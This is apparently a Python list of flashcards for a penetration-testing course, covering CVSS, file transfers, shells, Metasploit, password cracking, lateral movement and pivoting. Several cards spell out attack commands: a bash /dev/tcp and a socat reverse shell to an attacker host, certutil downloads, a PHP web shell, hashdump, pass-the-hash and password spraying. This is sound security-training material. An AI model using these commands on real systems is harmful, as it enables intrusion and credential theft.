new_flashcards = [

# Module 5
{"module_id":5,"question":"What CVSS 3.1 score constitutes a High severity vulnerability?","answer":"7.0 to 8.9. High findings require remediation within 30 days. Common examples: authenticated RCE, significant data exposure with low privileges required.","tags":["cvss","vulnerability-assessment"]},
{"module_id":5,"question":"What does searchsploit -m [ID] do?","answer":"Mirrors (copies) the exploit file to your current working directory. This lets you read, modify, and run the exploit locally without affecting the original exploit-db installation.","tags":["searchsploit","tools"]},
{"module_id":5,"question":"What are the three base metric groups in CVSS 3.1?","answer":"Exploitability metrics (AV, AC, PR, UI, S), Impact metrics (CIA: Confidentiality, Integrity, Availability), and Scope (whether impact crosses security boundaries).","tags":["cvss","methodology"]},
{"module_id":5,"question":"CVE-2021-41773 affects which software and what is the attack?","answer":"Apache httpd 2.4.49. Path traversal allows reading files outside web root. If mod_cgi enabled: unauthenticated RCE. CVSS 9.8. Fixed in 2.4.50 (but 2.4.50 was also vulnerable — CVE-2021-42013; fixed in 2.4.51).","tags":["cve","apache","web"]},
{"module_id":5,"question":"What is the difference between a vulnerability scanner and manual vulnerability assessment?","answer":"Automated scanners detect known CVEs by version/banner matching but miss logic flaws, default credentials, misconfigurations, and chained vulnerabilities. Manual assessment applies reasoning: is this configuration actually exploitable? Are there compensating controls? Are there chained low-severity issues that combine into critical impact?","tags":["methodology","vulnerability-assessment"]},
{"module_id":5,"question":"What tool on Kali searches the offline exploit-db database?","answer":"searchsploit. Located at /usr/share/exploitdb/. Update with: searchsploit --update. Use -t for title-only search, -m to copy an exploit, -x to examine without copying.","tags":["searchsploit","tools"]},
{"module_id":5,"question":"What does CVE-2011-2523 (vsftpd 2.3.4) expose?","answer":"A backdoor inserted into the vsftpd 2.3.4 source tarball. Sending a username ending with ':)' to FTP triggers the backdoor which opens a root shell on port 6200. CVE CVSS 10.0.","tags":["cve","ftp","backdoor"]},
{"module_id":5,"question":"In CVSS 3.1, what does Scope: Changed (S:C) mean?","answer":"The vulnerability can impact resources beyond the vulnerable component's security scope. Example: a VM escape where compromising the guest VM also compromises the hypervisor. S:C increases the CVSS score.","tags":["cvss","scope"]},
{"module_id":5,"question":"What NVD resource should you check after identifying a service version?","answer":"nvd.nist.gov — the National Vulnerability Database. Search by CPE (software name + version) to find all known CVEs, CVSS scores, and references to PoC/exploit code. Also check: cvedetails.com, vuldb.com.","tags":["vulnerability-assessment","research"]},
{"module_id":5,"question":"Why should you manually verify vulnerability scanner findings before reporting?","answer":"Automated scanners produce false positives based on version banners alone. A server may report Apache 2.4.49 in headers but actually be a load balancer or reverse proxy hiding a different backend. Manual verification (attempting the actual exploit or checking compensating controls) prevents reporting non-exploitable findings as Critical.","tags":["methodology","false-positives"]},

# Module 6
{"module_id":6,"question":"What Python command starts an HTTP server on port 8000 serving the current directory?","answer":"python3 -m http.server 8000. Binds to all interfaces by default. To specify interface: python3 -m http.server 8000 --bind 0.0.0.0","tags":["file-transfers","http","python"]},
{"module_id":6,"question":"What Windows command downloads a file from a URL without PowerShell?","answer":"certutil -urlcache -f http://IP/file.exe C:\\Temp\\file.exe. Also: bitsadmin /transfer job http://IP/file C:\\Temp\\file. Both work from cmd.exe without PowerShell.","tags":["file-transfers","windows","certutil"]},
{"module_id":6,"question":"How do you start an authenticated Impacket SMB server?","answer":"impacket-smbserver share . -smb2support -username user -password pass. The authentication prevents sandbox/AV systems from automatically connecting and triggering alerts. -smb2support is required for modern Windows.","tags":["file-transfers","smb","impacket"]},
{"module_id":6,"question":"How do you transfer files using base64 encoding when all network protocols are blocked?","answer":"On attacker: base64 -w 0 file.exe > file.b64 → copy the base64 string. On victim: echo 'BASE64' | base64 -d > file.exe (Linux) or [IO.File]::WriteAllBytes('file.exe',[Convert]::FromBase64String('BASE64')) (Windows). Works through any interactive shell session as text paste.","tags":["file-transfers","base64","evasion"]},
{"module_id":6,"question":"What SCP command downloads /etc/passwd from a remote server to your local machine?","answer":"scp user@10.10.10.5:/etc/passwd ./passwd.txt. SCP uses SSH protocol — requires SSH access to the target. chmod 600 on private keys before using -i id_rsa option.","tags":["file-transfers","scp","ssh"]},
{"module_id":6,"question":"What is the PowerShell BitsTransfer method for downloading files?","answer":"Start-BitsTransfer -Source http://IP/file.exe -Destination C:\\Temp\\file.exe. BITS (Background Intelligent Transfer Service) is a Windows service whitelisted in many enterprise environments and proxies.","tags":["file-transfers","powershell","bits"]},
{"module_id":6,"question":"How do you recursively download an FTP share anonymously?","answer":"wget -r ftp://anonymous:anonymous@IP/ — recursively downloads the entire FTP tree. Or: curl -s ftp://anonymous@IP/ lists files; then download individually with curl ftp://anonymous@IP/file -O file.","tags":["file-transfers","ftp","wget"]},
{"module_id":6,"question":"Why should you verify file integrity after transfer?","answer":"Partial transfers, network corruption, or AV quarantine can silently corrupt files. A corrupted tool produces cryptic errors. Compare MD5 hashes on both sides: md5sum file (Linux), Get-FileHash file (Windows). Always verify before spending time debugging a 'broken' tool.","tags":["file-transfers","integrity","methodology"]},

# Module 7
{"module_id":7,"question":"What is the full PTY upgrade sequence after getting a basic reverse shell?","answer":"(1) python3 -c 'import pty;pty.spawn(\"/bin/bash\")' (2) Ctrl+Z (3) stty raw -echo; fg (4) export TERM=xterm. Then set stty rows and columns to match your terminal. Without this, tab completion, Ctrl+C, su, and text editors fail.","tags":["shells","pty","upgrade"]},
{"module_id":7,"question":"What is the bash /dev/tcp reverse shell syntax?","answer":"bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1. The >& redirects both stdout and stderr to the TCP socket. 0>&1 redirects stdin from the socket. This is a pure bash feature — no netcat or socat required.","tags":["shells","bash","reverse-shell"]},
{"module_id":7,"question":"What msfvenom flag specifies the output format and what format is used for Windows exe files?","answer":"-f specifies format. For Windows executables: -f exe. Other formats: -f elf (Linux), -f raw (shellcode), -f php, -f war (Java), -f ps1 (PowerShell), -f dll.","tags":["msfvenom","payloads","shells"]},
{"module_id":7,"question":"What is the difference between a reverse shell and a bind shell?","answer":"Reverse shell: victim connects back to attacker (attacker listens). Preferred when firewalls block inbound connections to victim. Bind shell: victim listens for incoming attacker connection. Used when attacker is behind NAT. Reverse shells are used 90%+ of the time in practice.","tags":["shells","methodology"]},
{"module_id":7,"question":"What netcat listener command supports arrow keys and command history?","answer":"rlwrap nc -lvnp 4444. rlwrap wraps netcat with readline support, enabling up arrow for history, left/right for navigation. Essential for comfortable interaction with reverse shells.","tags":["shells","netcat","rlwrap"]},
{"module_id":7,"question":"What socat command gives a fully interactive PTY on the attacker side?","answer":"Attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444. Victim: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444. This provides a full PTY with no additional upgrade steps.","tags":["shells","socat","pty"]},
{"module_id":7,"question":"What PHP one-liner creates a web shell that executes GET parameter 'cmd'?","answer":"<?php system($_GET['cmd']); ?> — saves as shell.php. Access: http://target/shell.php?cmd=id. More capable: <?php echo shell_exec($_GET['e'].' 2>&1'); ?> which also captures stderr.","tags":["shells","web-shell","php"]},

# Module 8
{"module_id":8,"question":"What Metasploit module automates local privilege escalation suggestions on a Meterpreter session?","answer":"post/multi/recon/local_exploit_suggester. Run with: run post/multi/recon/local_exploit_suggester. Lists kernel exploits and local privilege escalation modules applicable to the target OS version.","tags":["metasploit","post-exploitation","privesc"]},
{"module_id":8,"question":"How do you add a network route through a Meterpreter session in msfconsole?","answer":"route add SUBNET/CIDR SESSION_ID — e.g., route add 192.168.1.0/24 1. This makes all Metasploit module traffic to that subnet route through session 1. Run route print to verify. Background session first with Ctrl+Z.","tags":["metasploit","pivoting","routing"]},
{"module_id":8,"question":"What is the msfconsole command to start a SOCKS5 proxy on port 1080 for proxychains?","answer":"use auxiliary/server/socks_proxy; set SRVPORT 1080; set VERSION 5; run -j. Then add 'socks5 127.0.0.1 1080' to /etc/proxychains.conf. All proxychains tools now route through the Metasploit SOCKS proxy.","tags":["metasploit","pivoting","socks"]},
{"module_id":8,"question":"What Meterpreter command dumps NTLM hashes from the local SAM database?","answer":"hashdump — requires SYSTEM privileges on the target. Outputs format: username:uid:LM_hash:NT_hash:::. The NT hash can be used for Pass-the-Hash attacks or cracked with hashcat -m 1000.","tags":["metasploit","meterpreter","credentials"]},
{"module_id":8,"question":"What is the difference between exploit/windows/smb/ms17_010_eternalblue and exploit/windows/smb/ms17_010_psexec?","answer":"ms17_010_eternalblue exploits the kernel-level buffer overflow directly for a shell. ms17_010_psexec chains the EternalBlue vulnerability to get code execution, then uses psexec for a more stable shell. eternalblue is more reliable on fully patched systems missing only MS17-010; psexec variant sometimes works when eternalblue alone fails.","tags":["metasploit","ms17-010","smb"]},
{"module_id":8,"question":"How do you migrate a Meterpreter session into another process?","answer":"ps — list processes. migrate [PID] — inject into that process. Useful reasons: (1) target process exits soon; (2) migrate to explorer.exe/winlogon.exe for stability; (3) migrate to x64 process from x86 payload; (4) avoid AV scanning of the original process. Requires appropriate privileges to inject.","tags":["metasploit","meterpreter","process"]},

# Module 9
{"module_id":9,"question":"What hashcat mode cracks NetNTLMv2 hashes captured with Responder?","answer":"-m 5600. NetNTLMv2 is captured when Responder poisons LLMNR/NBT-NS responses. Format: username::domain:challenge:hash:blob. Crack: hashcat -m 5600 netntlmv2.txt rockyou.txt","tags":["hashcat","password-attacks","responder"]},
{"module_id":9,"question":"What is the hashcat attack mode for mask attacks and what characters do ?u, ?l, ?d, ?s represent?","answer":"-a 3 enables mask attack. ?u=uppercase, ?l=lowercase, ?d=digit, ?s=special char. Example: hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?d?d?d?s matches patterns like Pass123!","tags":["hashcat","mask-attack","password-attacks"]},
{"module_id":9,"question":"What is AS-REP Roasting and which accounts are vulnerable?","answer":"AS-REP Roasting targets accounts with UF_DONT_REQUIRE_PREAUTH set in AD. These accounts respond to AS-REQ without Kerberos pre-authentication, returning an AS-REP ticket encrypted with the user's password hash — crackable offline. Tool: impacket-GetNPUsers. Hashcat mode: -m 18200.","tags":["kerberos","as-rep","active-directory"]},
{"module_id":9,"question":"What is password spraying and how does it differ from brute-force?","answer":"Password spraying tries ONE password against MANY usernames. This avoids account lockout (which is per-account, not per-IP). Brute-force tries MANY passwords against one username — triggers lockout quickly. Spray one password per lockout observation window. Common first spray targets: Season+Year, Company+Year!, Password1.","tags":["password-attacks","spraying","methodology"]},
{"module_id":9,"question":"How do you convert /etc/shadow hashes for John the Ripper cracking?","answer":"unshadow /etc/passwd /etc/shadow > combined.txt then john combined.txt --wordlist=rockyou.txt. Or use john directly: john shadow.txt --format=sha512crypt --wordlist=rockyou.txt. SHA-512 shadow hashes use format $6$.","tags":["john","linux","shadow"]},

# Module 10
{"module_id":10,"question":"What command connects to MSSQL on 10.10.10.5 as SA with no password using impacket?","answer":"impacket-mssqlclient sa:@10.10.10.5 (blank password after colon). Or: impacket-mssqlclient sa@10.10.10.5 -windows-auth for Windows integrated auth. Use -db [database] to specify initial database.","tags":["mssql","impacket","services"]},
{"module_id":10,"question":"What MySQL query reads /etc/passwd if FILE privilege is granted?","answer":"SELECT LOAD_FILE('/etc/passwd'); — returns file contents. Requires FILE privilege and secure_file_priv must be empty or set to the file's directory. Check: SHOW VARIABLES LIKE 'secure_file_priv';","tags":["mysql","file-read","services"]},
{"module_id":10,"question":"What is the difference between impacket-psexec, wmiexec, and smbexec?","answer":"psexec: uploads service binary via SMB + creates Windows service (noisy, detected). wmiexec: executes via WMI, no binary written (semi-interactive, stealthy). smbexec: executes via service on existing share without uploading binary (no files written). Order of stealth: smbexec > wmiexec > psexec.","tags":["impacket","smb","lateral-movement"]},
{"module_id":10,"question":"What evil-winrm flag performs Pass-the-Hash authentication?","answer":"-H NTLM_HASH — accepts just the NT portion (32 hex characters, the second half after the colon in NTLM dump format). Full command: evil-winrm -i target -u user -H [NT_HASH]","tags":["evil-winrm","pass-the-hash","winrm"]},
{"module_id":10,"question":"What port does WinRM use and what protocols?","answer":"HTTP: port 5985 (WS-Management over HTTP). HTTPS: port 5986 (WS-Management over HTTPS). WinRM must be explicitly enabled — it's on by default on Windows Server 2012+ but not on Windows 10/11 workstations.","tags":["winrm","ports","protocols"]},

# Module 11
{"module_id":11,"question":"What is the Ligolo-ng setup command to create the TUN interface?","answer":"sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up. Must run BEFORE starting the proxy. $USER should be your current username. Creates the ligolo network interface that handles routing.","tags":["ligolo-ng","pivoting","tun"]},
{"module_id":11,"question":"Why must you use nmap -sT instead of -sS when scanning through proxychains?","answer":"Nmap SYN scans (-sS) use raw socket programming that bypasses the OS TCP stack — proxychains hooks the TCP socket API but can't intercept raw socket calls. TCP Connect scan (-sT) uses the standard OS socket API (connect()), which proxychains can intercept and route through the SOCKS proxy.","tags":["proxychains","nmap","pivoting"]},
{"module_id":11,"question":"What SSH flags create a background dynamic SOCKS proxy?","answer":"-f (fork to background), -N (no command — proxy only), -D PORT (dynamic SOCKS5 proxy on PORT). Full: ssh -f -N -D 1080 user@pivot_host. Then add 'socks5 127.0.0.1 1080' to /etc/proxychains.conf.","tags":["ssh","socks","pivoting"]},
{"module_id":11,"question":"What is the difference between SSH local port forward (-L) and remote port forward (-R)?","answer":"-L local:target_host:target_port — makes a remote service accessible on your local machine. -R remote_port:local:local_port — makes a local service accessible on the remote machine. L = 'Listen locally, connect remotely'. R = 'Listen remotely, connect locally'.","tags":["ssh","port-forward","pivoting"]},
{"module_id":11,"question":"What socat command relays connections from port 8080 on the pivot to 10.10.10.20:80?","answer":"socat TCP-LISTEN:8080,fork TCP:10.10.10.20:80. The fork option handles multiple simultaneous connections. Run on the pivot host to relay attacker connections to the internal target.","tags":["socat","pivoting","relay"]},
{"module_id":11,"question":"What is sshuttle and when is it preferred over proxychains?","answer":"sshuttle creates a transparent VPN over SSH — all TCP traffic to specified subnets is routed through SSH without proxychains. Preferred when: using graphical tools (Burp, Firefox), tools that don't support proxychains, or multiple tools need simultaneous access. Command: sshuttle -r user@pivot 172.16.5.0/24","tags":["sshuttle","pivoting","vpn"]},
]

